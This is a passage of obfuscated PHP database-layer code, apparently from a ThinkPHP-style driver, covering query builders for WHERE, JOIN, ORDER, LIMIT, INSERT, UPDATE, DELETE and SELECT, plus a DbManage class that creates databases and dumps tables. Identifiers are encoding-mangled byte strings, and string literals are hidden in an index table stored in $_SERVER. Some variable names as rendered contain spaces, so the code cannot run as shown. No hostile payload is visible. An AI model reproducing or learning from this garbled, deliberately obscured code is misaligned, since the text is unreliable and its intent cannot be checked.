strpos($”Â‹÷Àˆ, $½»ÒòË­[11])) { $§Œ¾íäæ .= $this->parseThinkWhere($”Â‹÷Àˆ, $„—ŒâØŸ); } else { if (!preg_match($½»ÒòË­[1095], trim($”Â‹÷Àˆ))) { think_exception(think_lang($½»ÒòË­[1096]) . $½»ÒòË­[4] . $”Â‹÷Àˆ); } $’‹†í = is_array($„—ŒâØŸ) && isset($„—ŒâØŸ[$½»ÒòË­[1097]]); $”Â‹÷Àˆ = trim($”Â‹÷Àˆ); if (strpos($”Â‹÷Àˆ, $½»ÒòË­[214])) { $«’şòº = explode($½»ÒòË­[214], $”Â‹÷Àˆ); $¥ù›¦¯è = array(); foreach ($«’şòº as $µ¸˜˜Å‰ => $·û–†ŞÇ) { $µ¡²ø¾¡ = $’‹†í ? $„—ŒâØŸ[$µ¸˜˜Å‰] : $„—ŒâØŸ; $¥ù›¦¯è[] = $½»ÒòË­[337] . $this->parseWhereItem($this->parseKey($·û–†ŞÇ), $µ¡²ø¾¡) . $½»ÒòË­[994]; } $§Œ¾íäæ .= implode($½»ÒòË­[1098], $¥ù›¦¯è); } elseif (strpos($”Â‹÷Àˆ, $½»ÒòË­[360])) { $«’şòº = explode($½»ÒòË­[360], $”Â‹÷Àˆ); $¥ù›¦¯è = array(); foreach ($«’şòº as $µ¸˜˜Å‰ => $·û–†ŞÇ) { $µ¡²ø¾¡ = $’‹†í ? $„—ŒâØŸ[$µ¸˜˜Å‰] : $„—ŒâØŸ; $¥ù›¦¯è[] = $½»ÒòË­[337] . $this->parseWhereItem($this->parseKey($·û–†ŞÇ), $µ¡²ø¾¡) . $½»ÒòË­[994]; } $§Œ¾íäæ .= implode($½»ÒòË­[1093], $¥ù›¦¯è); } else { $§Œ¾íäæ .= $this->parseWhereItem($this->parseKey($”Â‹÷Àˆ), $„—ŒâØŸ); } } $§Œ¾íäæ .= $½»ÒòË­[355] . $™Ôáàª‹; } $§Œ¾íäæ = substr($§Œ¾íäæ, 0, -strlen($™Ôáàª‹)); } return empty($§Œ¾íäæ) ? $½»ÒòË­[12] : $½»ÒòË­[1099] . $§Œ¾íäæ; } protected function parseWhereItem($­ŞæáøÎ, $É•–ØÄ) { $šŠÏŸºˆ =& $_SERVER[íïàËŸë]; $µ™Áƒ£ = $šŠÏŸºˆ[12]; if (is_array($É•–ØÄ)) { if (is_string($É•–ØÄ[0])) { $””¤ïòû = strtolower($É•–ØÄ[0]); if (in_array($É•–ØÄ[0], array($šŠÏŸºˆ[973], $šŠÏŸºˆ[1100], $šŠÏŸºˆ[1101], $šŠÏŸºˆ[1102], $šŠÏŸºˆ[1103], $šŠÏŸºˆ[1104]))) { $µ™Áƒ£ .= $­ŞæáøÎ . $šŠÏŸºˆ[53] . $É•–ØÄ[0] . $šŠÏŸºˆ[53] . $this->parseValue($É•–ØÄ[1]); } elseif (preg_match($šŠÏŸºˆ[1105], $É•–ØÄ[0])) { $µ™Áƒ£ .= $­ŞæáøÎ . $šŠÏŸºˆ[53] . $this->exp[$””¤ïòû] . $šŠÏŸºˆ[53] . $this->parseValue($É•–ØÄ[1]); } elseif (preg_match($šŠÏŸºˆ[1106], $É•–ØÄ[0])) { if (is_array($É•–ØÄ[1])) { $å²”µ½ø = isset($É•–ØÄ[2]) ? strtoupper($É•–ØÄ[2]) : $šŠÏŸºˆ[1091]; if (in_array($å²”µ½ø, array($šŠÏŸºˆ[1090], $šŠÏŸºˆ[1091], $šŠÏŸºˆ[1092]))) { $ˆÖï½ê = array(); foreach ($É•–ØÄ[1] as $Àôòƒ²) { $ˆÖï½ê[] = $­ŞæáøÎ . $šŠÏŸºˆ[53] . $this->exp[$””¤ïòû] . $šŠÏŸºˆ[53] . $this->parseValue($Àôòƒ²); } $µ™Áƒ£ .= $šŠÏŸºˆ[337] . implode($šŠÏŸºˆ[53] . $å²”µ½ø . $šŠÏŸºˆ[53], $ˆÖï½ê) . $šŠÏŸºˆ[994]; } } else { $µ™Áƒ£ .= $­ŞæáøÎ . $šŠÏŸºˆ[53] . $this->exp[$””¤ïòû] . $šŠÏŸºˆ[53] . $this->parseValue($É•–ØÄ[1]); } } elseif ($šŠÏŸºˆ[373] == $””¤ïòû) { $µ™Áƒ£ .= $šŠÏŸºˆ[992] . $­ŞæáøÎ . $šŠÏŸºˆ[53] . $É•–ØÄ[1] . $šŠÏŸºˆ[1107]; } elseif (preg_match($šŠÏŸºˆ[1108], $É•–ØÄ[0])) { $µ™Áƒ£ .= $É•–ØÄ[0]; } elseif (preg_match($šŠÏŸºˆ[1109], $É•–ØÄ[0])) { if (isset($É•–ØÄ[2]) && $šŠÏŸºˆ[373] == $É•–ØÄ[2]) { $µ™Áƒ£ .= $­ŞæáøÎ . $šŠÏŸºˆ[53] . $this->exp[$””¤ïòû] . $šŠÏŸºˆ[53] . $É•–ØÄ[1]; } else { if (is_string($É•–ØÄ[1])) { $É•–ØÄ[1] = explode($šŠÏŸºˆ[50], $É•–ØÄ[1]); } $°˜›£¸Á = implode($šŠÏŸºˆ[50], $this->parseValue($É•–ØÄ[1])); $µ™Áƒ£ .= $­ŞæáøÎ . $šŠÏŸºˆ[53] . $this->exp[$””¤ïòû] . $šŠÏŸºˆ[992] . $°˜›£¸Á . $šŠÏŸºˆ[994]; } } elseif (preg_match($šŠÏŸºˆ[1110], $É•–ØÄ[0])) { $Íı³Ô§È = is_string($É•–ØÄ[1]) ? explode($šŠÏŸºˆ[50], $É•–ØÄ[1]) : $É•–ØÄ[1]; $µ™Áƒ£ .= $šŠÏŸºˆ[992] . $­ŞæáøÎ . $šŠÏŸºˆ[53] . $this->exp[$””¤ïòû] . $šŠÏŸºˆ[53] . $this->parseValue($Íı³Ô§È[0]) . $šŠÏŸºˆ[1093] . $this->parseValue($Íı³Ô§È[1]) . $šŠÏŸºˆ[355]; } else { think_exception(think_lang($šŠÏŸºˆ[1096]) . $šŠÏŸºˆ[4] . $É•–ØÄ[0]); } } else { $±‚Ì±« = count($É•–ØÄ); $ùÚçè±ñ = $šŠÏŸºˆ[12]; if (is_string($É•–ØÄ[$±‚Ì±« - 1])) { $ùÚçè±ñ = isset($É•–ØÄ[$±‚Ì±« - 1]) ? strtoupper($É•–ØÄ[$±‚Ì±« - 1]) : $šŠÏŸºˆ[12]; if (in_array($ùÚçè±ñ, array($šŠÏŸºˆ[1090], $šŠÏŸºˆ[1091], $šŠÏŸºˆ[1092]))) { $±‚Ì±« = $±‚Ì±« - 1; } } else { $ùÚçè±ñ = $šŠÏŸºˆ[1090]; } for ($º·Š¬ï¥ = 0; $º·Š¬ï¥ < $±‚Ì±«; $º·Š¬ï¥++) { $Íı³Ô§È = is_array($É•–ØÄ[$º·Š¬ï¥]) ? $É•–ØÄ[$º·Š¬ï¥][1] : $É•–ØÄ[$º·Š¬ï¥]; if ($šŠÏŸºˆ[373] == strtolower($É•–ØÄ[$º·Š¬ï¥][0])) { $µ™Áƒ£ .= $šŠÏŸºˆ[337] . $­ŞæáøÎ . $šŠÏŸºˆ[53] . $Íı³Ô§È . $šŠÏŸºˆ[1107] . $ùÚçè±ñ . $šŠÏŸºˆ[53]; } else { $¶³à“Ú = is_array($É•–ØÄ[$º·Š¬ï¥]) ? $this->exp[strtolower($É•–ØÄ[$º·Š¬ï¥][0])] : $šŠÏŸºˆ[973]; if (!$¶³à“Ú && is_array($É•–ØÄ[$º·Š¬ï¥]) && in_array($É•–ØÄ[$º·Š¬ï¥][0], array($šŠÏŸºˆ[973], $šŠÏŸºˆ[1100], $šŠÏŸºˆ[1101], $šŠÏŸºˆ[1102], $šŠÏŸºˆ[1103], $šŠÏŸºˆ[1104]))) { $¶³à“Ú = $É•–ØÄ[$º·Š¬ï¥][0]; } $µ™Áƒ£ .= $šŠÏŸºˆ[337] . $­ŞæáøÎ . $šŠÏŸºˆ[53] . $¶³à“Ú . $šŠÏŸºˆ[53] . $this->parseValue($Íı³Ô§È) . $šŠÏŸºˆ[1107] . $ùÚçè±ñ . $šŠÏŸºˆ[53]; } } $µ™Áƒ£ = substr($µ™Áƒ£, 0, -4); } } else { $µ™Áƒ£ .= $­ŞæáøÎ . $šŠÏŸºˆ[1111] . $this->parseValue($É•–ØÄ); } return $µ™Áƒ£; } protected function parseThinkWhere($–Ã–äÃ, $ßû†¾«Î) { $ÔıÈšÚº =& $_SERVER[íïàËŸë]; $¹ãáñ = $ÔıÈšÚº[12]; switch ($–Ã–äÃ) { case $ÔıÈšÚº[428]: $¹ãáñ = $ßû†¾«Î; break; case $ÔıÈšÚº[1094]: $¹ãáñ = is_string($ßû†¾«Î) ? $ßû†¾«Î : substr($this->parseWhere($ßû†¾«Î), 6); break; case $ÔıÈšÚº[1112]: parse_str($ßû†¾«Î, $Ê‘õÕÚ); if (isset($Ê‘õÕÚ[$ÔıÈšÚº[1089]])) { $Âğ ß¥ = $ÔıÈšÚº[53] . strtoupper($Ê‘õÕÚ[$ÔıÈšÚº[1089]]) . $ÔıÈšÚº[53]; unset($Ê‘õÕÚ[$ÔıÈšÚº[1089]]); } else { $Âğ ß¥ = $ÔıÈšÚº[1093]; } $¤É½ùú = array(); foreach ($Ê‘õÕÚ as $”›šõöĞ => $î´²”©à) { $¤É½ùú[] = $this->parseKey($”›šõöĞ) . $ÔıÈšÚº[1111] . $this->parseValue($î´²”©à); } $¹ãáñ = implode($Âğ ß¥, $¤É½ùú); break; } return $¹ãáñ; } protected function parseLimit($£–çÕßñ) { $Ü–¡Ùœ =& $_SERVER[íïàËŸë]; return !empty($£–çÕßñ) ? $Ü–¡Ùœ[51] . $£–çÕßñ . $Ü–¡Ùœ[53] : $Ü–¡Ùœ[12]; } protected function parseJoin($˜„¾€ÖÔ) { $¯Æ‘ìË¯ =& $_SERVER[íïàËŸë]; $Ëªú£ïË = $¯Æ‘ìË¯[12]; if (!empty($˜„¾€ÖÔ)) { if (is_array($˜„¾€ÖÔ)) { foreach ($˜„¾€ÖÔ as $×Ê¾î»ó => $­±úá²ë) { if (!1 !== stripos($­±úá²ë, $¯Æ‘ìË¯[1113])) { $Ëªú£ïË .= $¯Æ‘ìË¯[53] . $­±úá²ë; } else { $Ëªú£ïË .= $¯Æ‘ìË¯[1114] . $­±úá²ë; } } } else { $Ëªú£ïË .= $¯Æ‘ìË¯[1114] . $˜„¾€ÖÔ; } } $Ëªú£ïË = preg_replace($¯Æ‘ìË¯[1115], think_config($¯Æ‘ìË¯[1019]) . $¯Æ‘ìË¯[1116], $Ëªú£ïË); return $Ëªú£ïË; } protected function parseOrder($ŒÄ¢™ÎÇ) { $Ï›ª“¤” =& $_SERVER[íïàËŸë]; if (is_array($ŒÄ¢™ÎÇ)) { $ĞÇˆ÷° = array(); foreach ($ŒÄ¢™ÎÇ as $“Ï·³õĞ => $ìÓÙ»ñ) { if (is_numeric($“Ï·³õĞ)) { $ĞÇˆ÷°[] = $this->parseKey($ìÓÙ»ñ); } else { $ìÓÙ»ñ = in_array(strtoupper(trim($ìÓÙ»ñ)), array($Ï›ª“¤”[1117], $Ï›ª“¤”[1118])) ? $Ï›ª“¤”[53] . $ìÓÙ»ñ : $Ï›ª“¤”[12]; if (preg_match($Ï›ª“¤”[1119], $“Ï·³õĞ)) { $ĞÇˆ÷°[] = $this->parseKey($“Ï·³õĞ) . $ìÓÙ»ñ; } else { think_exception($Ï›ª“¤”[1120] . $“Ï·³õĞ); } } } $ŒÄ¢™ÎÇ = implode($Ï›ª“¤”[50], $ĞÇˆ÷°); } return !empty($ŒÄ¢™ÎÇ) ? $Ï›ª“¤”[1121] . $ŒÄ¢™ÎÇ : $Ï›ª“¤”[12]; } protected function parseGroup($¦ßøˆÁ) { $ßğïğÒ« =& $_SERVER[íïàËŸë]; return !empty($¦ßøˆÁ) ? $ßğïğÒ«[1122] . $¦ßøˆÁ : $ßğïğÒ«[12]; } protected function parseHaving($ÑÊü¨íÎ) { $ ¤÷˜‹‰ =& $_SERVER[íïàËŸë]; return !empty($ÑÊü¨íÎ) ? $ ¤÷˜‹‰[1123] . $ÑÊü¨íÎ : $ ¤÷˜‹‰[12]; } protected function parseComment($‚ìˆ¾çõ) { $îç˜”È =& $_SERVER[íïàËŸë]; return !empty($‚ìˆ¾çõ) ? $îç˜”È[1124] . $‚ìˆ¾çõ . $îç˜”È[1125] : $îç˜”È[12]; } protected function parseDistinct($ÉÂ°ë«Ã) { $ÎˆÅÙ¢û =& $_SERVER[íïàËŸë]; return !empty($ÉÂ°ë«Ã) ? $ÎˆÅÙ¢û[1126] : $ÎˆÅÙ¢û[12]; } protected function parseUnion($ŞöŸ”ò—) { $¡Ô—ª¸× =& $_SERVER[íïàËŸë]; if (empty($ŞöŸ”ò—)) { return $¡Ô—ª¸×[12]; } if (isset($ŞöŸ”ò—[$¡Ô—ª¸×[424]])) { $œû·Ø°¾ = $¡Ô—ª¸×[1127]; unset($ŞöŸ”ò—[$¡Ô—ª¸×[424]]); } else { $œû·Ø°¾ = $¡Ô—ª¸×[1128]; } foreach ($ŞöŸ”ò— as $Ê¼ÇÀ¨‰) { $„¼éœ—Ÿ[] = $œû·Ø°¾ . (is_array($Ê¼ÇÀ¨‰) ? $this->buildSelectSql($Ê¼ÇÀ¨‰) : $Ê¼ÇÀ¨‰); } return implode($¡Ô—ª¸×[53], $„¼éœ—Ÿ); } public function insert($ü…‰’‚«, $‹Ê‡ÎµÆ = array(), $†®”¶Û = false) { $Ã·ÅÖö =& $_SERVER[íïàËŸë]; $ËÈ¡üî¤ = $§Èı€¬ = array(); $this->model = $‹Ê‡ÎµÆ[$Ã·ÅÖö[358]]; foreach ($ü…‰’‚« as $ãñÔ†®  => $÷®¤³¶) { if (is_array($÷®¤³¶) && $Ã·ÅÖö[373] == $÷®¤³¶[0]) { $§Èı€¬[] = $this->parseKey($ãñÔ†® ); $ËÈ¡üî¤[] = $÷®¤³¶[1]; } elseif (is_scalar($÷®¤³¶) || is_null($÷®¤³¶)) { $§Èı€¬[] = $this->parseKey($ãñÔ†® ); $ËÈ¡üî¤[] = $this->parseValue($÷®¤³¶); } } $ß˜’Ì²ê = ($†®”¶Û ? $Ã·ÅÖö[996] : $Ã·ÅÖö[997]) . $Ã·ÅÖö[998] . $this->parseTable($‹Ê‡ÎµÆ[$Ã·ÅÖö[356]]) . $Ã·ÅÖö[992] . implode($Ã·ÅÖö[50], $§Èı€¬) . $Ã·ÅÖö[993] . implode($Ã·ÅÖö[50], $ËÈ¡üî¤) . $Ã·ÅÖö[994]; $ß˜’Ì²ê .= $this->parseLock(isset($‹Ê‡ÎµÆ[$Ã·ÅÖö[933]]) ? $‹Ê‡ÎµÆ[$Ã·ÅÖö[933]] : !1); $ß˜’Ì²ê .= $this->parseComment(!empty($‹Ê‡ÎµÆ[$Ã·ÅÖö[430]]) ? $‹Ê‡ÎµÆ[$Ã·ÅÖö[430]] : $Ã·ÅÖö[12]); return $this->execute($ß˜’Ì²ê, $this->parseBind(!empty($‹Ê‡ÎµÆ[$Ã·ÅÖö[361]]) ? $‹Ê‡ÎµÆ[$Ã·ÅÖö[361]] : array())); } public function selectInsert($ÙâóÌğ, $¬€¨Ò‡, $¹ŞÕ¾‚Œ = array()) { $â®è­ò‘ =& $_SERVER[íïàËŸë]; $this->model = $¹ŞÕ¾‚Œ[$â®è­ò‘[358]]; if (is_string($ÙâóÌğ)) { $ÙâóÌğ = explode($â®è­ò‘[50], $ÙâóÌğ); } array_walk($ÙâóÌğ, array($this, $â®è­ò‘[995])); $Äõœ±ü– = $â®è­ò‘[1129] . $this->parseTable($¬€¨Ò‡) . $â®è­ò‘[992] . implode($â®è­ò‘[50], $ÙâóÌğ) . $â®è­ò‘[1107]; $Äõœ±ü– .= $this->buildSelectSql($¹ŞÕ¾‚Œ); return $this->execute($Äõœ±ü–, $this->parseBind(!empty($¹ŞÕ¾‚Œ[$â®è­ò‘[361]]) ? $¹ŞÕ¾‚Œ[$â®è­ò‘[361]] : array())); } public function update($³ï„û©, $Ú¾óøé) { $¦¾‹§Å =& $_SERVER[íïàËŸë]; $this->model = $Ú¾óøé[$¦¾‹§Å[358]]; $‡¹«©Üü = $¦¾‹§Å[1130] . $this->parseTable($Ú¾óøé[$¦¾‹§Å[356]]) . $this->parseSet($³ï„û©) . $this->parseWhere(!empty($Ú¾óøé[$¦¾‹§Å[352]]) ? $Ú¾óøé[$¦¾‹§Å[352]] : $¦¾‹§Å[12]) . $this->parseOrder(!empty($Ú¾óøé[$¦¾‹§Å[441]]) ? $Ú¾óøé[$¦¾‹§Å[441]] : $¦¾‹§Å[12]) . $this->parseLimit(!empty($Ú¾óøé[$¦¾‹§Å[368]]) ? $Ú¾óøé[$¦¾‹§Å[368]] : $¦¾‹§Å[12]) . $this->parseLock(isset($Ú¾óøé[$¦¾‹§Å[933]]) ? $Ú¾óøé[$¦¾‹§Å[933]] : !1) . $this->parseComment(!empty($Ú¾óøé[$¦¾‹§Å[430]]) ? $Ú¾óøé[$¦¾‹§Å[430]] : $¦¾‹§Å[12]); return $this->execute($‡¹«©Üü, $this->parseBind(!empty($Ú¾óøé[$¦¾‹§Å[361]]) ? $Ú¾óøé[$¦¾‹§Å[361]] : array())); } public function delete($úæ¸Œ = array()) { $Šêíôü =& $_SERVER[íïàËŸë]; $this->model = $úæ¸Œ[$Šêíôü[358]]; $èÌ´¾ş™ = $Šêíôü[1131] . $this->parseTable($úæ¸Œ[$Šêíôü[356]]) . $this->parseWhere(!empty($úæ¸Œ[$Šêíôü[352]]) ? $úæ¸Œ[$Šêíôü[352]] : $Šêíôü[12]) . $this->parseOrder(!empty($úæ¸Œ[$Šêíôü[441]]) ? $úæ¸Œ[$Šêíôü[441]] : $Šêíôü[12]) . $this->parseLimit(!empty($úæ¸Œ[$Šêíôü[368]]) ? $úæ¸Œ[$Šêíôü[368]] : $Šêíôü[12]) . $this->parseLock(isset($úæ¸Œ[$Šêíôü[933]]) ? $úæ¸Œ[$Šêíôü[933]] : !1) . $this->parseComment(!empty($úæ¸Œ[$Šêíôü[430]]) ? $úæ¸Œ[$Šêíôü[430]] : $Šêíôü[12]); return $this->execute($èÌ´¾ş™, $this->parseBind(!empty($úæ¸Œ[$Šêíôü[361]]) ? $úæ¸Œ[$Šêíôü[361]] : array())); } public function select($ËÙ±ã±Ù = array()) { $ãÑà×Ëó =& $_SERVER[íïàËŸë]; $this->model = $ËÙ±ã±Ù[$ãÑà×Ëó[358]]; $Ö¦»¦Â÷ = $this->buildSelectSql($ËÙ±ã±Ù); $­»ş…Ö× = isset($ËÙ±ã±Ù[$ãÑà×Ëó[425]]) ? $ËÙ±ã±Ù[$ãÑà×Ëó[425]] : !1; if ($­»ş…Ö×) { $ˆÁ‹İ‰Ú = is_string($­»ş…Ö×[$ãÑà×Ëó[97]]) ? $­»ş…Ö×[$ãÑà×Ëó[97]] : $ãÑà×Ëó[1132] . md5($Ö¦»¦Â÷); $¾‰úÎÔ‹ = think_cache($ˆÁ‹İ‰Ú, $ãÑà×Ëó[12], $­»ş…Ö×); if (!1 !== $¾‰úÎÔ‹) { return $¾‰úÎÔ‹; } } $íî¬³¹ = $this->query($Ö¦»¦Â÷, $this->parseBind(!empty($ËÙ±ã±Ù[$ãÑà×Ëó[361]]) ? $ËÙ±ã±Ù[$ãÑà×Ëó[361]] : array())); if ($­»ş…Ö× && !1 !== $íî¬³¹) { think_cache($ˆÁ‹İ‰Ú, $íî¬³¹, $­»ş…Ö×); } return $íî¬³¹; } public function buildSelectSql($ëº¦úùà = array()) { $û—»“¾£ =& $_SERVER[íïàËŸë]; if (isset($ëº¦úùà[$û—»“¾£[429]])) { if (strpos($ëº¦úùà[$û—»“¾£[429]], $û—»“¾£[50])) { list($§ƒ“’ÁŸ, $ø‰è¨—§) = explode($û—»“¾£[50], $ëº¦úùà[$û—»“¾£[429]]); } else { $§ƒ“’ÁŸ = $ëº¦úùà[$û—»“¾£[429]]; } $§ƒ“’ÁŸ = $§ƒ“’ÁŸ ? $§ƒ“’ÁŸ : 1; $ø‰è¨—§ = isset($ø‰è¨—§) ? $ø‰è¨—§ : (is_numeric($ëº¦úùà[$û—»“¾£[368]]) ? $ëº¦úùà[$û—»“¾£[368]] : 20); $Í’İ´é = $ø‰è¨—§ * ((int) $§ƒ“’ÁŸ - 1); $ëº¦úùà[$û—»“¾£[368]] = $Í’İ´é . $û—»“¾£[50] . $ø‰è¨—§; } if (think_config($û—»“¾£[1133])) { $Á°§×£‹ = $û—»“¾£[1134] . md5(serialize($ëº¦úùà)); $ššÙÅÓÓ = think_cache($Á°§×£‹); if ($ššÙÅÓÓ) { return $ššÙÅÓÓ; } } $ÁŸÈƒ = $this->parseSql($this->selectSql, $ëº¦úùà); $ÁŸÈƒ .= $this->parseLock(isset($ëº¦úùà[$û—»“¾£[933]]) ? $ëº¦úùà[$û—»“¾£[933]] : !1); if (isset($Á°§×£‹)) { think_cache($Á°§×£‹, $ÁŸÈƒ); } return $ÁŸÈƒ; } public function parseSql($º¨§¤Ë¨, $è…˜¦® = array()) { $¤¶öå“š =& $_SERVER[íïàËŸë]; $º¨§¤Ë¨ = str_replace(array($¤¶öå“š[1135], $¤¶öå“š[1136], $¤¶öå“š[1137], $¤¶öå“š[1138], $¤¶öå“š[1139], $¤¶öå“š[1140], $¤¶öå“š[1141], $¤¶öå“š[1142], $¤¶öå“š[1143], $¤¶öå“š[1144], $¤¶öå“š[1145]), array($this->parseTable("{$è…˜¦®[$¤¶öå“š[356]]}"), $this->parseDistinct(isset($è…˜¦®[$¤¶öå“š[1146]]) ? $è…˜¦®[$¤¶öå“š[1146]] : !1), $this->parseField(!empty($è…˜¦®[$¤¶öå“š[350]]) ? $è…˜¦®[$¤¶öå“š[350]] : $¤¶öå“š[220]), $this->parseJoin(!empty($è…˜¦®[$¤¶öå“š[359]]) ? $è…˜¦®[$¤¶öå“š[359]] : $¤¶öå“š[12]), $this->parseWhere(!empty($è…˜¦®[$¤¶öå“š[352]]) ? $è…˜¦®[$¤¶öå“š[352]] : $¤¶öå“š[12]), $this->parseGroup(!empty($è…˜¦®[$¤¶öå“š[578]]) ? $è…˜¦®[$¤¶öå“š[578]] : $¤¶öå“š[12]), $this->parseHaving(!empty($è…˜¦®[$¤¶öå“š[1147]]) ? $è…˜¦®[$¤¶öå“š[1147]] : $¤¶öå“š[12]), $this->parseOrder(!empty($è…˜¦®[$¤¶öå“š[441]]) ? $è…˜¦®[$¤¶öå“š[441]] : $¤¶öå“š[12]), $this->parseLimit(!empty($è…˜¦®[$¤¶öå“š[368]]) ? $è…˜¦®[$¤¶öå“š[368]] : $¤¶öå“š[12]), $this->parseUnion(!empty($è…˜¦®[$¤¶öå“š[423]]) ? $è…˜¦®[$¤¶öå“š[423]] : $¤¶öå“š[12]), $this->parseComment(!empty($è…˜¦®[$¤¶öå“š[430]]) ? $è…˜¦®[$¤¶öå“š[430]] : $¤¶öå“š[12])), $º¨§¤Ë¨); return $º¨§¤Ë¨; } public function getLastSql($Õã†…Ñ = '') { return $Õã†…Ñ ? $this->modelSql[$Õã†…Ñ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($œĞàæŞ) { return addslashes($œĞàæŞ); } public function setModel($ÑÛÎ²æÓ) { $this->model = $ÑÛÎ²æÓ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($»¸Ù¾³¬ = array()) { $¿äÜíšü =& $_SERVER[íïàËŸë]; if (empty($»¸Ù¾³¬)) { $»¸Ù¾³¬ = $GLOBALS[$¿äÜíšü[6]][$¿äÜíšü[21]]; } $this->database = $»¸Ù¾³¬; } public function model($Á‘ÈŞã» = '') { return new ModelBase($Á‘ÈŞã», $_SERVER[íïàËŸë][12], $this->database); } public function db($ùÚûøÇœ = false) { $ÁŸîÅ =& $_SERVER[íïàËŸë]; $çÔ®ì÷ = array_change_key_case($this->database); if ($this->dbType() == $ÁŸîÅ[13] || !$ùÚûøÇœ) { return $this->model()->db(); } $Ö¹¼ÅÈö = $çÔ®ì÷[$ÁŸîÅ[1061]]; $çÔ®ì÷[$ÁŸîÅ[1061]] = $ÁŸîÅ[12]; if ($çÔ®ì÷[$ÁŸîÅ[1056]] == $ÁŸîÅ[1053]) { $ˆßşİŸ = $çÔ®ì÷[$ÁŸîÅ[1062]]; $çÔ®ì÷[$ÁŸîÅ[1062]] = substr($ˆßşİŸ, 0, strrpos($ˆßşİŸ, $ÁŸîÅ[1148])); } $this->database = $çÔ®ì÷; $§ÑÆûÕ÷ = $this->model()->db(); try { $¤ñèóÈ° = $§ÑÆûÕ÷->execute("\163\150\157\x77\x20\144\x61\x74\x61\142\141\x73\x65\163\x20\154\x69\x6b\x65\x20\x27{$Ö¹¼ÅÈö}\x27"); } catch (Exception $å§²ÙçÎ) { } if (!$¤ñèóÈ°) { $§ÑÆûÕ÷->execute("\143\162\x65\x61\164\145\x20\144\x61\164\141\x62\x61\163\145\40\x60{$Ö¹¼ÅÈö}\140"); } $çÔ®ì÷[$ÁŸîÅ[1061]] = $Ö¹¼ÅÈö; if ($çÔ®ì÷[$ÁŸîÅ[1056]] == $ÁŸîÅ[1053]) { $çÔ®ì÷[$ÁŸîÅ[1062]] .= $ÁŸîÅ[1148] . $Ö¹¼ÅÈö; } $this->database = $çÔ®ì÷; $§ÑÆûÕ÷->execute("\165\x73\x65\x20\140{$Ö¹¼ÅÈö}\x60"); return $§ÑÆûÕ÷; } public function createTable($ŞËÌ‰©ø, &$ã§ìÈÌ) { $í£İÛ÷” =& $_SERVER[íïàËŸë]; if (!IO::exist($ŞËÌ‰©ø)) { ActionCall($í£İÛ÷”[1149], !0, 0); show_json(LNG($í£İÛ÷”[1150]), !1); } $ÖßúÈÁÊ = $this->model()->db(); $Õ·ïŞÙã = sqlSplit(IO::getContent($ŞËÌ‰©ø)); foreach ($Õ·ïŞÙã as $Î­ƒÈ‚«) { $¼şÜ¡åå = stripos($Î­ƒÈ‚«, $í£İÛ÷”[1151]) === 0; if ($¼şÜ¡åå) { $ã§ìÈÌ->task[$í£İÛ÷”[1152]] += 1; } $ÖßúÈÁÊ->execute($Î­ƒÈ‚«); if ($¼şÜ¡åå) { preg_match($í£İÛ÷”[1153], $Î­ƒÈ‚«, $²Â¨–…†); $ã§ìÈÌ->task[$í£İÛ÷”[1154]] = $²Â¨–…†[1]; $ã§ìÈÌ->update(1); } } } public function insertTable($ªƒÉèÛ, &$â€ÏÉñë) { $õÌàÊ¬Ù =& $_SERVER[íïàËŸë]; $¿ü¡‹Ğœ = $this->model()->db(); $ÀĞŠ­¸º = $òä¢÷´ª ? array($òä¢÷´ª) : $¿ü¡‹Ğœ->getTables(); foreach ($ªƒÉèÛ as $“ Ææ£â) { $òä¢÷´ª = basename($“ Ææ£â, $õÌàÊ¬Ù[871]); if (!in_array($òä¢÷´ª, $ÀĞŠ­¸º)) { continue; } $â€ÏÉñë->task[$õÌàÊ¬Ù[1154]] = $òä¢÷´ª; if (get_filesize($“ Ææ£â) == 0) { continue; } $Ï¬³ÉÑâ = $this->sqlToDb($“ Ææ£â, $â€ÏÉñë); if (!$Ï¬³ÉÑâ) { ActionCall($õÌàÊ¬Ù[1149], !0, 0); show_json(LNG($õÌàÊ¬Ù[1155]) . "\133{$òä¢÷´ª}\x5d", !1); } } } public function sqlFromDb($ª¾¨Ò´è, $æõÖçüş, &$ƒášš’, $ß§œçê¿ = '') { if ($ƒášš’) { $ƒášš’->task[$_SERVER[íïàËŸë][1154]] = $ª¾¨Ò´è; } $³ò¢¿š« = $this->model($ª¾¨Ò´è); $ÆÀ«Œäœ = 0; $Ò¶‡‚‰´ = 0; $Éñ“»È¨ = 10000; $ñÃ¥æ­† = fopen($æõÖçüş, $_SERVER[íïàËŸë][1156]); $ı–èŸö = $³ò¢¿š«->getPk(); $ˆĞÔ§æä = $³ò¢¿š«->getDbFields(); $ïê‡âõÉ = $_SERVER[íïàËŸë][12]; if ($GLOBALS[$_SERVER[íïàËŸë][870]] && in_array($ª¾¨Ò´è, array($_SERVER[íïàËŸë][1157], $_SERVER[íïàËŸë][1158]))) { $ïê‡âõÉ = $ª¾¨Ò´è; } do { $¶ÊÛÕÉ = array($ı–èŸö => array($_SERVER[íïàËŸë][1103], $Ò¶‡‚‰´)); $²ğœì˜ = $³ò¢¿š«->where($¶ÊÛÕÉ)->field($ˆĞÔ§æä)->order($ı–èŸö . $_SERVER[íïàËŸë][1159])->limit($Éñ“»È¨)->select(); $²ğœì˜ = !empty($²ğœì˜) ? $²ğœì˜ : array(); if (!($ÖşÇ‹½‰ = count($²ğœì˜))) { break; } $¸åù¦–… = end($²ğœì˜); $Ò¶‡‚‰´ = $¸åù¦–…[$ı–èŸö]; $Ü§¢öüÙ = array(); foreach ($²ğœì˜ as $¶Œ÷±Ó¨) { if ($ïê‡âõÉ) { if ($ª¾¨Ò´è == $_SERVER[íïàËŸë][1157]) { if ($¶Œ÷±Ó¨[$_SERVER[íïàËŸë][33]] == $_SERVER[íïàËŸë][1160]) { $ ¬ˆ»Ãƒ = json_decode($¶Œ÷±Ó¨[$_SERVER[íïàËŸë][450]], !0); if ($ ¬ˆ»Ãƒ[$_SERVER[íïàËŸë][32]] == $GLOBALS[$_SERVER[íïàËŸë][870]] && $ ¬ˆ»Ãƒ[$_SERVER[íïàËŸë][833]] != 1) { continue; } } } else { if ($¶Œ÷±Ó¨[$_SERVER[íïàËŸë][33]] == $_SERVER[íïàËŸë][1161] && $¶Œ÷±Ó¨[$_SERVER[íïàËŸë][97]] == $_SERVER[íïàËŸë][865]) { continue; } } } if ($ß§œçê¿) { $¶Œ÷±Ó¨[$_SERVER[íïàËŸë][87]] = "\x7b\151\157\72{$ß§œçê¿}\x7d" . 